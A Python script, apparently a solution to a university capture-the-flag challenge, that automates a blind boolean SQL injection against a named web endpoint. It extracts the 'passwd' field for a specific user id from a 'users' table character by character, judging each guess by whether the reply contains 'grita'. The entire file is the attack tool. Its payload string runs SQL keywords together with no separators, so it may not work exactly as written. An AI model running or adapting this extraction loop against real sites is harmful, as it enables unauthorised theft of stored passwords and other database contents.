import requests
import time

URL = "https://retosql2.dsa.linti.unlp.edu.ar/"
HEADERS = {"User-Agent": "Mozilla/5.0"}
CHARSET = [chr(i) for i in range(32, 127)]
MAX_LENGTH = 60
TARGET_ID = 13150

def respuesta_es_positiva(payload):
    try:
        r = requests.get(URL, params={"name": payload}, headers=HEADERS)
        return "grita" not in r.text.lower()
    except Exception as e:
        print(f"[!] Error de red: {e}")
        return False

def extraer_flag():
    resultado = ""
    print("[🔍] Iniciando extracción sin espacios ni barras...")

    for i in range(1, MAX_LENGTH + 1):
        encontrado = False
        for c in CHARSET:
            ascii_val = ord(c)
            # Payload sin espacios ni /
            payload = f"'ORascii(substr((SELECTpasswdFROMusersWHEREid={TARGET_ID}),{i},1))={ascii_val}--+"
            if respuesta_es_positiva(payload):
                resultado += c
                print(f"[+] Pos {i}: '{c}' → {resultado}")
                encontrado = True
                if resultado.endswith("}"):
                    print("[✅] Flag completa detectada.")
                    return resultado
                break
        if not encontrado:
            print(f"[!] Fin inesperado en pos {i}")
            break
    return resultado

if __name__ == "__main__":
    flag = extraer_flag()
    print(f"\n🎯 FLAG ENCONTRADA: {flag}")
